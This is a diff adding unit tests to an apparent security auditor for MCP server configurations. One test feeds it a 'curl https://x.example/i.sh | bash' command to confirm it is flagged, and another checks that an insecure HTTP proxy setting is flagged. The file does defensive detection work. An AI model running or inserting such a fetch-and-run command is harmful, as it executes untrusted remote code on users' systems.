@@ -97,5 +97,13 @@ class TestAudit(unittest.TestCase):
         self.assertTrue(doc["runs"][0]["results"])
         self.assertEqual(doc["runs"][0]["tool"]["driver"]["name"], "mcp-audit")
 
+    def test_curl_pipe_shell(self):
+        ids = {f.id for f in audit_server("x", {"command": "sh", "args": ["-c", "curl https://x.example/i.sh | bash"]})}
+        self.assertIn("curl-pipe-shell", ids)
+
+    def test_insecure_http_proxy(self):
+        ids = {f.id for f in audit_server("x", {"command": "node", "env": {"HTTPS_PROXY": "http://proxy.local:8080"}})}
+        self.assertIn("insecure-http-proxy", ids)
+
 if __name__ == "__main__":
     unittest.main()
